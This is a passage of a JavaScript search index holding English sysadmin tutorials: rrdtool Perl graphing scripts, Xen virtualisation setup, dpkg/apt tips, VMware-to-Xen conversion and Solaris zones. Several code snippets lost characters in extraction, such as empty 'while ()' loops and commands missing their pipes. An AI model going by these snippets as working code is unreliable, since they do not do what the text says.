# Get all userspace size \u0026get_users_size($total_size,\\@users); # Get free size and unknow size @ksize=\u0026get_free_size($total_size,$busy_size,\\@ksize); # Write datas file \u0026write_datas_file(\\@users,\\@ksize,\\@printable_size,\\@colors); Updating the Database linkNow for updating the database, we’ll need to put a script in crontab to update it:\n#!/usr/bin/perl -w use strict; my $source='/var/www/.stats/datas'; my $destination='/var/www/.stats/rrd_db.rrd'; my @rrd_arg; my $gb_size; open (RRD_DATA, \"\u003c$source\"); while () { chomp $_; unless (/disponible|autre/i) { if (/^.*:(\\d*):/) { $gb_size=sprintf (\"%.1f\", ($1 / 1048576)); push @rrd_arg, $gb_size; } } } close (RRD_DATA); @rrd_arg = join ':', @rrd_arg; system \"rrdtool update $destination N:@rrd_arg\\n\"; Adapt the source and destination here.\nGenerating Graphs linkTo generate the graphs, we’ll need to define where the images will be stored. For this, adapt the source, rrd_db and the 2 destinations. There will be one image for the day graph and one image for the 2-week graph:\n#!/usr/bin/perl -w use strict; my $source='/var/www/.stats/datas'; my $rrd_db='/var/www/.stats/rrd_db.rrd'; my $destination_day='/var/www/.stats/usage_day.png'; my $destination_week='/var/www/.stats/usage_week.png'; my @users_lines; my @colors_lines; my @user_size; open (RRD_DATA, \"\u003c$source\"); my $i=1; while () { chomp $_; unless (/disponible|autres/i) { if (/(.*):(.*):(.*):(.*)/ ) { push @users_lines, \"'DEF:user$i=$rrd_db:$1:AVERAGE'\"; push @colors_lines, \"'LINE1:user$i$4:$1 ($3)'\"; $i++; } } } close (RRD_DATA); # Generate day graph system \"rrdtool graph $destination_day -a PNG --title=\\\"Utilisation disque par jour\\\" --vertical-label \\\"Giga Octets\\\" @users_lines @colors_lines\"; # Generate 2 weeks graphs system \"rrdtool graph $destination_week --start -2weeks --end N -a PNG --title=\\\"Utilisation disque (2 semaines)\\\" --vertical-label \\\"Giga Octets\\\" @users_lines @colors_lines\"; Now, we have everything we need to create, update and generate graphs. Let’s just set the proper execution rights:\nchmod u+rx /etc/scripts/* And finish by defining the crontab:\n# Generate graphs */5 * * * * /etc/scripts/gen-piechart-db.pl 2\u003e/dev/null */5 * * * * /etc/scripts/gen-datas.pl ; /etc/scripts/update-rrd.pl ; /etc/scripts/gen-rrd-graph.pl 1\u003e /dev/null Resources linkhttp://www.cuddletech.com/articles/rrd/index.html http://oss.oetiker.ch/rrdtool/ http://www.vandenbogaerdt.nl/rrdtool/tutorial/graph.php\n"
            }
        );
    index.add(
            {
                id:  460 ,
                href: "\/WebDav_:_S%C3%A9curiser_avec_SSL\/",
                title: "WebDAV: Securing with SSL",
                description: "How to secure WebDAV connections using SSL encryption for improved security.",
                content: "Here is documentation on how to secure your WebDAV!\nHow To Set Up WebDAV With MySQL Authentication On Apache2 How To Set Up WebDAV With Apache2 Documentation on Securing Webdav Mixing Apache Authentication "
            }
        );
    index.add(
            {
                id:  461 ,
                href: "\/Zenity_:_Du_GUI_pour_vos_scripts_simplement\/",
                title: "Zenity: GUI for Your Scripts Easily",
                description: "Learn how to use Zenity, a tool developed by the Gnome team that allows you to easily display GTK dialog boxes from shell scripts.",
                content: "Introduction linkI recently discovered with delight Zenity, developed by the Gnome team, which allows you to easily display GTK dialog boxes from shell scripts.\nThere is also dialog for ASCII GUI options.\nExample of Restarting a Service linkHere is an example to restart the openvpn service (openvpn-restart.sh):\nzenity --question --text=\"Start OpenVPN ?\" --ok-label=\"Yes\" --cancel-label=\"No\" if [ $? = 0 ] ; then sudo /etc/init.d/openvpn restart fi "
            }
        );
    index.add(
            {
                id:  462 ,
                href: "\/Mise_en_place_de_Xen\/",
                title: "Setting up Xen",
                description: "A comprehensive guide for setting up and configuring Xen virtualization on Linux systems, covering installation, network configuration, virtual machine creation and troubleshooting.",
                content: "Introduction linkXen allows multiple operating systems (and their applications) to run in isolation on the same physical machine. Guest operating systems share the host machine’s resources.\nXen is a “paravirtualizer” or “hypervisor” for virtual machines. Guest operating systems are “aware” of the underlying Xen system and need to be “ported” (adapted) to work on Xen. Linux, NetBSD, FreeBSD, and Plan 9 can already run on Xen.\nXen 3 can also run unmodified systems like Windows on processors that support VT technology.\nWith Intel Vanderpool and AMD Pacifica technologies, this porting will soon no longer be necessary, and all operating systems will be supported.\nThe x86, x64, IA-64, PowerPC, and SPARC architectures are supported. Multiprocessor (SMP) and partially Hyper-Threading are supported.\nSome might ask, why not use XenExpress or a paid version to get additional functionality? Apart from having support, there’s no real reason except for having a nice graphical interface to manage your VMs.\nIn my opinion, unless you’re managing a park of 100 physical machines, the paid version is not really necessary. Here are the differences from the Citrix DataSheet (01/26/2008):\nThe version we’ll install below has no restrictions and is free :-). On the other hand, you’ll spend more time on configuration than with a GUI, that’s for sure! It’s up to you to see what you really need.\nInstallation link32 bits linkIt’s very easy to install Xen on Debian:\napt-get install linux-image-2.6-xen-686 xen-hypervisor-3.0.3-1-i386-pae xen-tools xen-linux-system-2.6.18-5-xen-686 linux-headers-2.6-xen-686 libc6-xen And if you also need to install Windows, then add this:\napt-get install xen-ioemu-3.0.3-1 64 bits linkIt’s very easy to install Xen on Debian:\napt-get install linux-image-2.6-xen-amd64 linux-image-xen-amd64 xen-linux-system-2.6.18-5-xen-amd64 linux-headers-2.6-xen-amd64 xen-hypervisor-3.2-1-amd64 xen-tools xenstore-utils xenwatch xen-shell And if you also need to install Windows, then add this:\napt-get install xen-ioemu-3.0.3-1 Configuration linkKernel linkTo configure the kernel, we’ll use certain directives to ensure that dom0_mem never takes more than 512 MB of memory. This is to leave all available space for our domUs:\ntitle Xen 3.0.3-1-i386-pae / Debian GNU/Linux, kernel 2.6.18-5-xen-686 root (hd0,1) kernel /boot/xen-3.0.3-1-i386-pae.gz dom0_mem=512m module /boot/vmlinuz-2.6.18-5-xen-686 root=/dev/sda2 ro console=tty0 max_loop=64 module /boot/initrd.img-2.6.18-5-xen-686 The “max_loop=64” directive ensures that we won’t run out of loopback devices, which are heavily used by Xen. This is a classic error and can be recognized by this type of message:\nError: Device 2049 (vbd) could not be connected. Backend device not found. Modules linkWe’ll also load the loop module and set it to 64 as above\n# /etc/modules loop max_loop=64 Network linkConfiguration of the interface linkPhysical Interface linkLet’s set up a bridge interface, /etc/network/interfaces:\nauto eth0 iface eth0 inet static address 192.168.0.90 netmask 255.255.255.0 gateway 192.168.0.248 auto eth1 iface eth1 inet manual auto xenbr0 iface xenbr0 inet static address 192.168.130.254 netmask 255.255.255.0 bridge_ports eth1 bridge_maxwait 0 We bridge on eth1 because we only have one public IP on this machine. It is therefore out of the question to bridge on the public interface eth0. You’ll need to create a dummy0 interface (simulated) if you only have a single physical interface.\nIt is also strongly recommended to create a dummy interface to avoid any POSTROUTING problems with Iptables and network slowdowns:\niptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to 192.168.0.3:80 To see bridges:\n$ brctl show bridge name\tbridge id\tSTP enabled\tinterfaces xenbr0\t8000.ee5ad8739af7\tno\tvif0.0 peth0 tap0 vif6.0 vif31.0 Dummy Interface linkModify the /etc/network/interfaces file:\nauto eth0 iface eth0 inet static address 192.168.0.90 netmask 255.255.255.0 gateway 192.168.0.248 iface dummy0 inet manual auto xenbr0 iface xenbr0 inet static address 192.168.130.254 netmask 255.255.255.0 bridge_ports dummy0 bridge_maxwait 0 You can check your bridges with this command:\n$ brctl show xenbr0\t8000.1a87802de454\tno\tdummy0 vif1.0 tap0 Bridge Mode linkThe “Bridge” mode is set up by the script /etc/xen/scripts/network-bridge. Here’s how it works:\nCreation of the new Bridge “xenbr0” Stopping the “real” network card “eth0” Copying the MAC and IP addresses from “eth0” to a virtual network interface “veth0” Renaming “eth0” to “peth0” Renaming “veth0” to “eth0” Attaching “peth0” and “vif0.0” to the bridge “xenbr0” Starting the bridge interfaces “xenbr0”, “peth0”, “eth0” and “vif0.0” To enable bridge mode, edit the file /etc/xen/xend-config.sxp and uncomment:\n(network-script network-bridge) (vif-script vif-bridge) Edit this file /etc/xen-tools/xen-tools.conf and put this:\nlvm = my_lvm_vg # Will use an LVM volgroup to create partitions on the fly debootstrap = 1 size = 5Gb # Disk image size. memory = 128Mb # Memory size swap = 128Mb # Swap size fs = ext3 # use the EXT3 filesystem for the disk image. dist = etch # Default distribution to install. image = full gateway = 192.168.0.11 netmask = 255.255.255.0 passwd = 1 kernel = /boot/vmlinuz-`uname -r` initrd = /boot/initrd.img-`uname -r` serial_device = hvc0 Linux linkTo create an image with debootstrap (Debian for example), use the file /etc/xen-tools/xen-tools.conf. When you’ve edited it as desired, you can create the appropriate image. Here are some examples:\nxen-create-image --hostname=vm03.example.com --ip=192.168.0.103 --netmask=255.255.255.0 --gateway=192.168.0.1 --dir=/vserver/images --dist=sarge --debootstrap xen-create-image --debootstrap --hostname xen-etch --dhcp --dist=etch xen-create-image --hostname=xen4 --size=3Gb --swap=128Mb --memory=512Mb --ip=172.30.4.155 Windows linkFor Windows, don’t expect amazing performance in terms of network and disk, because until the PV drivers are released from the commercial versions (even Xen Express), performance will remain poor (e.g., network: 1.5 MB/s max).\nNevertheless, if this is sufficient for you, insert this to create a 4 GB file:\ndd if=/dev/zero of=/var/xen/images/WinXP.img bs=1M count=4096 Then configure what’s needed below to make it work:\nkernel = \"/usr/lib/xen-3.0.3-1/boot/hvmloader\" builder = 'hvm' name = \"WindowsXP\" disk = [ 'file:/mnt/disk1/Winxp/WinXP.img,ioemu:hda,w', 'file:/mnt/disk1/xp-sp2.iso,hdb:cdrom,r' ] device_model = '/usr/lib/xen-3.0.3-1/bin/qemu-dm' # cdrom is no longer used since XEN 3.02 cdrom = '/dev/hdb' memory = 512 boot = 'dca' device_model = 'qemu-dm' nic=2 vif = [ 'type=ioemu, mac=00:50:56:01:09:01, bridge=xenbr0, model=pcnet' ] sdl = 1 vncviewer = 0 localtime = 1 ne2000 = 0 vcpus = 1 serial = 'pty' # Correct mouse problems usbdevice = 'tablet' on_poweroff = 'destroy' on_reboot = 'restart' on_crash = 'restart' Change the vcpu option depending on the number of cores available on your machine.\nAll that’s left is to start the install:\nxm create /etc/xen/WindowsXP.cfg BSD link kernel = '/usr/lib/xen-3.0.3-1/boot/hvmloader' builder = 'hvm' memory = '512' name = 'OpenBSD' device_model = '/usr/lib/xen-3.0.3-1/bin/qemu-dm' # Number of network cards nic = 1 # ne2k_pci is not the fastest (RTL8139), but works with xBSD # Otherwise pcnet also works vif = [ 'type=ioemu, bridge=xenbr0, model=pcnet' ] sdl = 0 # The output will be visible on a vnc server on display 1 vnc = 1 vnclisten = '192.168.130.20' vncunused = 0 vncdisplay = 1 vncpasswd = '' # For physical disk: phy:/dev/mapper/example # For a file: file:/mnt/iso/examples.iso disk = [ 'file:/root/test.img,ioemu:hda,w', 'file:/root/iso/cd42.iso,hdc:cdrom,r' ] boot = 'cd' on_poweroff = 'destroy' on_reboot = 'restart' on_crash = 'restart' acpi = 0 apic = 0 For disk images, here are the supported formats:\nvvfat vpc bochs dmg cloop vmdk qcow cow raw parallels qcow2 dmg raw host_device Additional Options linkHere are some additional options that can be very useful…\nVNC Server at VM Boot linkTo launch a VNC server when booting a VM, add these lines to your VM config file (here: /etc/xen/WindowsXP.cfg):\nvnc = 1 vncviewer = 1 vncdisplay = 1 stdvga = 0 sdl = 0 Then edit /etc/xen/xend-config.sxp and add this:\n# The interface for VNC servers to listen on. Defaults # to 127.0.0.1 To restore old 'listen everywhere' behaviour # set this to 0.0.0.0 (vnc-listen '0.0.0.0') You may need a package for this to work:\napt-get install libsdl1.2debian-all Different Boot Devices link To load a hard disk from an image for Windows: disk = [ 'file:/mnt/disk1/Winxp/WindowsXP.img,ioemu:hda,w' ] Load a CD from a drive for Windows: disk = [ 'phy:/dev/cdrom,ioemu:hda,r' ] Load an ISO image: disk = [ 'file:/mnt/disk1/xp-sp2.iso,hda:cdrom,r' ] hda: must match your cdrom’s udev!\nLoad a CD from a drive: disk = [ 'phy:/dev/cdrom,hda:cdrom,r' ] hda: must match your cdrom’s udev!\nLimitations linkCPU allocation: more/less:\nHot increase of used memory:\nxm mem-max xen4 612 xm mem-set xen4 612 Don’t forget to modify the virtual server configuration file that also contains the memory size.\nMigration linkMemory migration from the source server:\nxm migrate -l xen2migrate xenhost_destination Launching a Virtual Machine linkTo start a machine, nothing could be simpler:\nxm create -c /etc/xen/my_xen.cfg The -c option is used to get control immediately after execution.\nIf you don’t use -c, you can get a console like this:\nxm console the_name_of_my_xen_machine If you want to exit the console:\nCtrl + AltGr + ] Then you can check the status:\nxm list FAQ link4gb seg fixup, process syslogd (pid 15584), cs:ip 73:b7ed76d0 linkThe guest kernel, which is a master vserver, gives a number of insults. The solution is indicated here:\nhttp://bugs.donarmstrong.com/cgi-bin/bugreport.cgi?bug=405223\nIt involves installing libc6-xen and doing mv /lib/tls /lib/tls.disabled on the guest vservers.\nError: Device 2049 (vbd) could not be connected. Hotplug scripts not working linkThis message is obtained when launching a DomU (xm create toto.cfg). One cause could be the non-existence of one of the DomU partitions. If you use LVM, check that the volumes exist.\nError: Device 0 (vif) could not be connected. Backend device not found linkThis is probably because your Xend network is not configured. To fix this, replace the line in your /etc/xen/xend-config.sxp file:\n(network-script network-dummy) with\n(network-script 'network-bridge netdev=eth0') Don’t forget to restart xend:\n/etc/init.d/xend restart re0: watchdog timeout linkThis is all we got when we chose the rtl8139 NIC driver for a NetBSD or OpenBSD domU.\nFinally, it’s a response from Manuel Bouyer on port-xen that gives the solution:\nDisable re*! It’s then rtk* that takes over, and there, no timeout, latency, or other malfunction, “it just works”.\nResources link http://www.cl.cam.ac.uk/research/srg/netos/xen/readmes/user/ Xen Documentation Paravirtualization with Xen Xen Setting up a Perfect Server Xentools Documentation (Xen-Shell and Argo) XenExpress Documentation Xen for Debian Documentation How To Make Your Xen-PAE Kernel Work With More Than 4GB RAM Documentation on Heartbeat2 Xen cluster with drbd8 and OCFS2 XEN On An Ubuntu - High Performance NetBSD Xen Guide XEN and disk space optimization Consolidation issues and achievement of service level objectives (SLO) with Xen How To Run Fully-Virtualized Guests (HVM) With Xen 3 2 On Debian Lenny Xen Live Migration Of An LVM-Based Virtual Machine With iSCSI On Debian Lenny Creating A Fully Encrypted Para-Virtualised Xen Guest System Using Debian Lenny "
            }
        );
    index.add(
            {
                id:  463 ,
                href: "\/Monter_des_images_disque_en_ligne_de_commande\/",
                title: "Mount Disk Images from Command Line",
                description: "How to mount disk images using command line tools",
                content: "Introduction linkYou may sometimes need to manually mount disk images. Here’s how to do it.\nUsage link hdiutil attach somefile.dmg "
            }
        );
    index.add(
            {
                id:  464 ,
                href: "\/Utilisation_avanc%C3%A9e_des_packages_Debian\/",
                title: "Advanced Usage of Debian Packages",
                description: "A comprehensive guide to advanced Debian package management using dpkg, aptitude, and apt-get tools with practical examples.",
                content: "Introduction linkQuite possibly the most distinguishing feature of Debian-based Linux distributions (such as Ubuntu, Mepis, Knoppix, etc) is their package system – APT. Also known as the Advanced Package Tool, APT was first introduced in Debian 2.1 in 1999. APT is not so much a specific program as it is a collection of separate, related packages.\nWith APT, Linux gained the ability to install and manage software packages in a much simpler and more efficient way than was previously possible. Before its introduction, most software had to be installed either by manually compiling the source code, or using individual packages with no automatic dependency handling (such as RPM files). This could mean hours of “dependency hell” even to install a fairly trivial program.\nIn this article, we are going to highlight some of APT’s best features, and share a few of the lesser known features of APT and its cousin dpkg.\nDpkg linkThe base of Debian’s package system is dpkg. It performs all the low level functions of software installation. If you were so inclined, you could use dpkg alone to manage your software. It can install, remove, and provide information on your system’s software collection. Here are some of my favorite features.\nBasic installation of local file linkSome software authors create Debian packages of their programs, but do not provide a repository for APT to fetch from. In this case they just provide a downloadable .deb file. This is very similar to RPM packages, or even Windows .msi files. It contains all the files and configuration information necessary to install the program. To install a program from a .deb file, you simply need:\ndpkg -i MyNewProgram.deb The -i, as you may guess, tells dpkg to install this piece of software.\nListing a package’s contents linkYou may find yourself, after installing a program, unable to figure out how to run that program. Sometimes, you need to know where to find the config files for your new game. Dpkg provides an easy way to list all the files that belong to a particular package.\ndpkg -L MyNewProgram Note that case matters. -L and -l are entirely different options.\nOften, a package has so many files it can be difficult to sift through the list to find the one(s) you’re looking for. If that’s the case, we can use grep to filter the results. The following command does the same as above, but only shows results that have “bin” in the path, such as /usr/bin.\ndpkg -L MyNewProgram I won’t even begin to go into the awesome power that is grep, but in its simplest form it can be used, like above, to quickly and easily filter a program’s output.\nDiscover what package a file belongs to linkOccasionally, you find yourself in a situation that’s the reverse of the section above. You have a file, but you don’t know what package it belongs to. Once again, dpkg has you covered.\ndpkg -S mysteryfile.cfg This will tell you which package created/owns that file.\nListing what you’ve got installed linkLet’s say you’re about to reinstall your system, and you want to know exactly what you’ve already got installed. You could open up an app like Synaptic and set a filter to show everything marked as “installed”, or you could do it quickly and easily from the command line with dpkg.\ndpkg -l or\ndpkg --get-selections That will give you one big long list of everything you’ve got installed. Advanced users could use these commands to create a text file with all their packages listed, which could be fed into APT later to reinstall everything at once!\nReconfiguring a package linkWhen a .deb package is installed, it goes through a few stages. One of those is the configuration stage, where developers can put a series of actions that take place once all the files have been installed to a proper location. This includes things like start/stopping services, or creating logs, or other such things. Sometimes you need to repeat those steps, without going through the whole reinstallation process. For that, you use:\ndpkg-reconfigure (packagename) This will redo all the post-install steps needed for that package without forcing you to reinstall. Believe me, this one comes in handy.\nAptitude/Apt-get linkThere’s some debate and confusion regarding these two tools. Many Linux users have a hard time telling when/why to use one over the other, as they do roughly the same thing.\nShort answer: use Aptitude.\nLong answer: Both can be used to manage all software installations removals, and both will do a good job. The Debian team officially recommends using Aptitude. It’s not that it’s a LOT better than apt-get, but that it’s a little better, in lots of ways. You can use either one and it will meet your package management needs, but don’t mix and match on the same system. Pick one and stick with it.\nFinding the right package linkI often find myself in need of software to do a certain thing, but I don’t know the name of any programs to do it. For example, I may need a FLAC player, but don’t know offhand what player will work…\nAptitude:\naptitude search flac Classic APT:\napt-cache search flac You’ll get a list of available packages that have “flac” in the name or description.\nPreventing a package from updating linkOn some occasions, I have a version of a package that I want to keep even though there may be upgrades. When it comes to my kernel, for example, I prefer to update manually.\nAptitude:\naptitude hold (packagename) dpkg:\necho \"(packagename) hold\" Upgrading linkBoth Aptitude and classic APT provide two methods of upgrading your system: upgrade and dist-upgrade. This is another thing that causes some confusion. An upgrade is an upgrade, right? Well not exactly.\nA regular upgrade will read your list of packages, check online for newer versions, and install them as needed. It will NOT, however, perform any upgrades that would require new packages installed, or existing ones removed. This is what dist-upgrade is for. It will get every newer version it finds, even if it involves installing something new (such as a dependency) or removing an existing package (if it’s obsolete or is no longer needed).\nAptitude:\naptitude safe-upgrade aptitude full-upgrade Classic APT:\napt-get upgrade apt-get dist-upgrade Learn about a package linkFinally, sometimes you just need to know a little about a package. What version is it? Who maintains it? Is it already installed? All these things and more you can find with:\nAptitude:\naptitude show (packagename) APT:\napt-cache showpkg (packagename) All of the programs mentioned here are capable of far more than I’ve shown. The tips here should go a long way in helping you use this amazing package system to its full potential.\nAlso, for those with the patience to read all the way to the end,\napt-get moo "
            }
        );
    index.add(
            {
                id:  465 ,
                href: "\/Convertion_dimages_Vmware_vers_Xen\/",
                title: "Converting VMware Images to Xen",
                description: "Guide on how to convert VMware disk images (vmdk) to Xen format and run them in HVM mode with full virtualization.",
                content: "Introduction linkAt work, I received some new toys. The particularity of these machines is that they are equipped with “Dual-Core Intel Xeon 5140 Processor (2.33 GHz, 1333 FSB)” CPUs, and the special feature of these CPUs is that in small print at the bottom of their spec sheet, you can read “NOTE: Intel Xeon Processor 5100/5000 sequence are 64-bit, Dual-Core, 4MB L2 Cache, and support Intel VT technology.” And that’s awesome.\nI had been waiting for Santa to come for a while to fulfill a long-thought-out fantasy: shifting a complete lab platform from VMware to Xen. To make it short: not only does it work, but as expected, it performs amazingly well.\nConversion linkHere is a summary of what you need to know to migrate a VMware vmdk image to a Xen image:\nUsing qemu-img, a tool integrated into qemu which you will obviously install beforehand, we convert the .vmdk to a raw image usable by Xen:\nqemu-img convert test.vmdk test.img Launching linkHere is a working configuration that takes into account the HVM (Hardware-assisted Virtual Machine) mode, aka full virtualization, without modifying the guest. This feature requires a CPU that supports VT technology:\nkernel = '/usr/lib/xen/boot/hvmloader' builder = 'hvm' memory = '256' name = 'test' device_model = '/usr/lib/xen/bin/qemu-dm' # We declare two network cards of type pcnet, those that VMware emulates nic=2 vif = [ 'type=ioemu, mac=00:50:56:01:09:01, bridge=xenbr0, model=pcnet', \\ 'type=ioemu, mac=00:56:3e:00:00:02, bridge=xenbr0, model=pcnet' ] sdl=0 # The output will be visible on a vnc server on display 1 vnc=1 vnclisten='192.168.10.20' vncunused=0 vncdisplay=1 vncpasswd='' disk = [ 'file:/home/xen/test/test.img,hda,w' ] After classically creating your domain:\nxm create test Just connect to the vnc console from a vncviewer client:\nvncviewer 192.168.10.20:5901 Conclusion linkYou can now show off in front of your salespeople.\nResources linkConverting a disk image to LVM\n"
            }
        );
    index.add(
            {
                id:  466 ,
                href: "\/Configuration_et_utilisation_des_Zones_Solaris_(Containers)\/",
                title: "Configuration and Usage of Solaris Zones (Containers)",
                description: "Guide to configuring and using Solaris Zones (Containers) including installation, management, and resource control techniques",
                content: "Introduction linkZones or Containers are:\nVirtual instance of Solaris Software partition for the OS A large SunFire server with hardware domains allows many isolated systems to be created. Zones achieve this in software and is far more flexible - it is easy to move individual CPUs between zones as needed, or to configure a more sophisticated way to share CPUs and memory.\nConfiguration linkThere are two general zone types to pick from during zone creation. They are,\nSmall zone - (also known as a “Sparse Root zone”): The default. This consumes the least disk space, has the best performance and the best security. Big zone - (also known as a “Whole Root zone”): The zone has its own /usr files, which can be modified independently. If you aren’t sure which to choose, pick the small zone. Below are examples of installing each zone type as a starting point for Zone Resource Controls.\nSmall Zone linkThis demonstrates creating a simple zone that uses the default settings which share most of the operating system with the global zone. The final layout will be like the following,\nTo create such a zone involves letting the system pick default settings, which includes the loopback filesystem (lofs) read only mounts that share most of the OS. The following commands were used,\nzonecfg -z small-zone small-zone: No such zone configured Use 'create' to begin configuring a new zone. zonecfg:small-zone\u003e create zonecfg:small-zone\u003e set autoboot=true zonecfg:small-zone\u003e set zonepath=/export/small-zone zonecfg:small-zone\u003e add net zonecfg:small-zone:net\u003e set address=192.168.2.101 zonecfg:small-zone:net\u003e set physical=hme0 zonecfg:small-zone:net\u003e end zonecfg:small-zone\u003e info zonepath: /export/small-zone autoboot: true pool: inherit-pkg-dir: dir: /lib inherit-pkg-dir: dir: /platform inherit-pkg-dir: dir: /sbin inherit-pkg-dir: dir: /usr net: address: 192.168.2.101 physical: hme0 zonecfg:small-zone\u003e verify zonecfg:small-zone\u003e commit zonecfg:small-zone\u003e exit zoneadm list -cv ID NAME STATUS PATH 0 global running / - small-zone configured /export/small-zone The new zone is in a configured state. Those inherited-pkg-dir’s are filesystems that will be shared lofs (loopback filesystem) readonly from the global; this saves copying the entire operating system over during install, but can make adding packages to the small-zone difficult as /usr is readonly. (See the big-zone example that uses a different approach).\nWe can see the zonecfg command has saved the info to an XML file in /etc/zones:\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE zone PUBLIC \"-//Sun Microsystems Inc//DTD Zones//EN\" \"file:///usr/share/lib/xml/dtd/zonecfg.dtd.1\"\u003e Next we begin the zone install, it takes around 10 minutes to initialise the packages it needs for the new zone. A verify is run first to check our zone config is ok, then we run the install, then boot the zone:\nmkdir /export/small-zone chmod 700 /export/small-zone zoneadm -z small-zone verify zoneadm -z small-zone install Preparing to install zone . Creating list of files to copy from the global zone. Copying \u003c2574\u003e files to the zone. Initializing zone product registry. Determining zone package initialization order. Preparing to initialize \u003c987\u003e packages on the zone. Initialized \u003c987\u003e packages on zone. Zone is initialized. Installation of these packages generated warnings: The file contains a log of the zone installation. zoneadm list -cv ID NAME STATUS PATH 0 global running / - small-zone installed /export/small-zone zoneadm -z small-zone boot zoneadm list -cv ID NAME STATUS PATH 0 global running / 1 small-zone running /export/small-zone We can see small-zone is up and running. Now we login for the first time to the console, so we can answer system identification questions such as timezone,\nzlogin -C small-zone [Connected to zone 'small-zone' console] 100/100 What type of terminal are you using? 1) ANSI Standard CRT 2) DEC VT52 3) DEC VT100 4) Heathkit 19 5) Lear Siegler ADM31 6) PC Console 7) Sun Command Tool 8) Sun Workstation 9) Televideo 910 10) Televideo 925 11) Wyse Model 50 12) X Terminal Emulator (xterms) 13) CDE Terminal Emulator (dtterm) 14) Other Type the number of your choice and press Return: 13 ...standard questions... The system then reboots. To get an idea of what this zone actually is, lets poke around it’s zonepath from the global zone,\n/\u003e cd /export/small-zone /export/small-zone\u003e ls dev root /export/small-zone\u003e cd root /export/small-zone/root\u003e ls bin etc home mnt opt proc system usr dev export lib net platform sbin tmp var /export/small-zone/root\u003e grep lofs /etc/mnttab /export/small-zone/dev /export/small-zone/root/dev lofs zonedevfs,dev=4e40002 1110446770 /lib /export/small-zone/root/lib lofs ro,nodevices,nosub,dev=2200008 1110446770 /platform /export/small-zone/root/platform lofs ro,nodevices,nosub,dev=2200008 1110446770 /sbin /export/small-zone/root/sbin lofs ro,nodevices,nosub,dev=2200008 1110446770 /usr /export/small-zone/root/usr lofs ro,nodevices,nosub,dev=2200008 1110446770 /export/small-zone/root\u003e du -hs etc var 38M etc 30M var /export/small-zone/root\u003e From the directories that are not lofs shared from the global zone, the main ones are /etc and /var. They add up to around 70Mb, which is roughly how much extra disk space was required to create this small-zone.\nBig Zones linkThis demonstrates creating a zone that resides on it’s own slice, which has it’s own copy of the operating system. The final layout will be like the following:\nFirst we create the slice:\nnewfs /dev/dsk/c0t1d0s0 newfs: construct a new file system /dev/rdsk/c0t1d0s0: (y/n)? y /dev/rdsk/c0t1d0s0: 16567488 sectors in 16436 cylinders of 16 tracks, 63 sectors 8089.6MB in 187 cyl groups (88 c/g, 43.31MB/g, 5504 i/g) super-block backups (for fsck -F ufs -o b=#) at: 32, 88800, 177568, 266336, 355104, 443872, 532640, 621408, 710176, 798944, 15700704, 15789472, 15878240, 15967008, 16055776, 16144544, 16233312, 16322080, 16410848, 16499616, ed /etc/vfstab 362 $a /dev/dsk/c0t1d0s0 /dev/rdsk/c0t1d0s0 /export/big-zone ufs 1 yes - . w 455 q mkdir /export/big-zone mountall checking ufs filesystems /dev/rdsk/c0t1d0s0: is clean. mount: /tmp is already mounted or swap is busy Now we configure the zone to not use any inherit-pkg-dir’s by using the “-b” option.\n$ zonecfg -z big-zone big-zone: No such zone configured Use 'create' to begin configuring a new zone. zonecfg:big-zone\u003e create -b zonecfg:big-zone\u003e set autoboot=true zonecfg:big-zone\u003e set zonepath=/export/big-zone zonecfg:big-zone\u003e add net zonecfg:big-zone:net\u003e set address=192.168.2.201 zonecfg:big-zone:net\u003e set physical=hme0 zonecfg:big-zone:net\u003e end zonecfg:big-zone\u003e info zonepath: /export/big-zone autoboot: true pool: net: address: 192.168.2.201 physical: hme0 zonecfg:big-zone\u003e verify zonecfg:big-zone\u003e commit zonecfg:big-zone\u003e exit \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE zone PUBLIC \"-//Sun Microsystems Inc//DTD Zones//EN\" \"file:///usr/share/lib/xml/dtd/zonecfg.dtd.1\"\u003e chmod 700 /export/big-zone df -h /export/big-zone Filesystem size used avail capacity Mounted on /dev/dsk/c0t1d0s0 7.8G 7.9M 7.7G 1% /export/big-zone zoneadm -z big-zone verify zoneadm -z big-zone install Preparing to install zone . Creating list of files to copy from the global zone. Copying \u003c118457\u003e files to the zone. ... After the zone has been installed and booted, we now check the size of the dedicated zone slice,\ndf -h /export/big-zone Filesystem size used avail capacity Mounted on /dev/dsk/c0t1d0s0 7.8G 2.9G 4.8G 39% /export/big-zone Wow! 2.9Gb, pretty much most of Solaris 10. This zone resides on it’s own slice, and can add many packages as though it was a separate system. Using inherit-pkg-dir as happened with small-zone can be great, but it’s good to know we can do this as well.\nManagement linkView or list all running zones linkThe zoneadm command can be used to list active or running zones.\nTo view a list and brief status information about running zones, use the following command from the global zone:\nzoneadm list -vc ID NAME STATUS PATH 0 global running / 2 zone2 running /opt/zone2 The -v option provides the additional information other than the zone name.\nShutdown or stop a zone linkTo boot a Solaris 10 zone called testzone, use the following command as root in the global zone:\nzoneadm -z testzone boot You can watch the system boot by logging into the zone’s console:\nzlogin -C testzone Uninstall and delete a zone linkWhen you want to remove a non-global zone from your Solaris 10 installation, you’ll need to follow the following steps.\nIf you want to completely remove a zone called ’testzone’ from your system, login to the global zone and become root. The first command is the opposite of the ‘install’ option of zoneadm and deletes all of the files under the zonepath:\nzoneadm -z testzone uninstall At this point, the zone is in the configured state. To remove it completely from the system use:\nzonecfg -z testzone delete There is no undo, so make sure this is what you want to do before you do it.\nResource Control linkUse cpu-shares to control zone computing resources linkAlthough the Solaris 10 08/07 OS allows you to specify how many CPUs can be used in a zone, sometimes this does not work out well. For example, I use dedicated-cpu for three zones in an 8-core Sun Fire T2000 server. Each zone has 4-20 specified for ncpus with a different importance value. However, when the system is fully utilized, the importance value does not always play its role. Sometimes, a zone with a lower importance value consumes a higher percentage of the computing resources than a zone with higher importance.\nIn the following, I demonstrate that cpu-shares works well.\nroot@bigfoot# dispadmin -d FSS (Fair Share) root@bigfoot# zonecfg -z global info rctl rctl: name: zone.cpu-shares value: (priv=privileged,limit=4,action=none) root@bigfoot# zonecfg -z bighead info rctl name=zone.cpu-shares rctl: name: zone.cpu-shares value: (priv=privileged,limit=3,action=none) root@bigfoot# zonecfg -z bighand info rctl name=zone.cpu-shares rctl: name: zone.cpu-shares value: (priv=privileged,limit=3,action=none) Generate 20 processes in zone bighead:\n@bighead\u003e perl -e 'while (--$ARGV[0] and fork) {}; while () {}' 20 \u0026 Generate 12 processes in zone bighand:\n@bighand\u003e perl 